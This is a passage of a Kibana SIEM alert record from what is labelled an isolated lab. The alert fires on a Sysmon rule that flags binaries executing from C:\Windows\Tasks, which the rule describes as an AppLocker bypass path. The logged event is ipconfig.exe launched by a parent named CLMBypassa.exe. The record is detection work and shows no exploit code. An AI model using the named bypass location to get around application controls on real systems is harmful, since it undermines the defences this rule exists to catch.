      "LAB2019\\Administrator"
    ],
    "kibana.alert.last_detected": [
      "2026-03-23T15:09:47.447Z"
    ],
    "signal.depth": [
      1
    ],
    "signal.rule.immutable": [
      "false"
    ],
    "winlog.user.type": [
      "User"
    ],
    "kibana.alert.rule.rule_type_id": [
      "siem.queryRule"
    ],
    "signal.rule.name": [
      "Sysmon - Binary Execution from Windows Tasks"
    ],
    "kibana.alert.original_event.provider": [
      "Microsoft-Windows-Sysmon"
    ],
    "signal.rule.rule_id": [
      "fb8585fa-7191-4f86-99d1-169743c114fc"
    ],
    "kibana.alert.rule.license": [
      ""
    ],
    "winlog.event_data.Hashes": [
      "MD5=B8CB2DFCA7379908B0605331A759AF4C,SHA256=B0832DEC07A4CB6228B7B392D6ABAFB79E9BF7327605AE3E86E1E617DE7495A5,IMPHASH=98CEEAF3EB55DE32686F14F2CF79FC6F"
    ],
    "kibana.alert.original_event.kind": [
      "event"
    ],
    "winlog.user.identifier": [
      "S-1-5-18"
    ],
    "winlog.task": [
      "Process Create (rule: ProcessCreate)"
    ],
    "winlog.user.domain": [
      "NT AUTHORITY"
    ],
    "kibana.alert.rule.updated_at": [
      "2026-03-23T15:04:43.875Z"
    ],
    "signal.rule.description": [
      "Detects binary execution from C:\\Windows\\Tasks - a well-documented AppLocker bypass path. Any execution from this location should be treated as suspicious"
    ],
    "winlog.event_data.IntegrityLevel": [
      "High"
    ],
    "message": [
      "Process Create:\nRuleName: -\nUtcTime: 2026-03-23 15:05:39.308\nProcessGuid: {6e4a868b-56c3-69c1-0202-000000001500}\nProcessId: 6048\nImage: C:\\Windows\\SysWOW64\\ipconfig.exe\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\nDescription: IP Configuration Utility\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: ipconfig.exe\nCommandLine: \"C:\\Windows\\system32\\ipconfig.exe\"\nCurrentDirectory: C:\\Windows\\Tasks\\\nUser: LAB2019\\Administrator\nLogonGuid: {6e4a868b-378b-69c1-b204-070000000000}\nLogonId: 0x704B2\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: MD5=B8CB2DFCA7379908B0605331A759AF4C,SHA256=B0832DEC07A4CB6228B7B392D6ABAFB79E9BF7327605AE3E86E1E617DE7495A5,IMPHASH=98CEEAF3EB55DE32686F14F2CF79FC6F\nParentProcessGuid: {6e4a868b-56b2-69c1-ff01-000000001500}\nParentProcessId: 6412\nParentImage: C:\\Windows\\Tasks\\CLMBypassa.exe\nParentCommandLine: \"C:\\Windows\\Tasks\\CLMBypassa.exe\"\nParentUser: LAB2019\\Administrator"
    ],
    "winlog.event_id": [
      "1"
    ],
    "signal.original_event.action": [
      "Process Create (rule: ProcessCreate)"
    ],
    "kibana.alert.rule.created_at": [
      "2026-03-23T15:04:43.875Z"
    ],
    "signal.rule.to": [
      "now"
    ],
    "kibana.space_ids": [
      "default"
    ],
    "winlog.event_data.CurrentDirectory": [
      "C:\\Windows\\Tasks\\"
    ],
    "kibana.alert.rule.execution.type": [
      "scheduled"
    ],
    "winlog.event_data.ParentCommandLine": [
      "\"C:\\Windows\\Tasks\\CLMBypassa.exe\""
    ],
    "winlog.event_data.Product": [
      "Microsoft® Windows® Operating System"
    ],
    "kibana.alert.original_time": [
      "2026-03-23T15:05:39.309Z"
    ]
  }
}



*Isolated lab environment. Windows Server 2019 DC and Windows 11 Enterprise VM. No production systems involved.*
